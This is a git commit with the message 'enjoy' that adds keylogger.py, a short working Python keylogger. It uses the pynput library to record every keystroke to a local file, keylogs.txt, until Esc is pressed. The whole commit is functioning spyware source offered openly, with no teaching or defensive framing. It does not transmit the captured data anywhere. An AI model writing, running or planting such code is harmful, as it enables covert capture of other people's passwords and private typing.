7d84679069c8255e899b9e005ae812b660fc48c3
Pr1nd3x <121652445+phsh1m1zu@users.noreply.github.com>
2023-10-19 21:54:15 +0800

    enjoy
    enjoy

---
+++ keylogger.py
@@ -0,0 +1,15 @@
+from pynput import keyboard
+
+def on_press(key):
+    with open("keylogs.txt", "a") as f:
+        try:
+            f.write(key.char)
+        except AttributeError:
+            f.write(str(key))
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
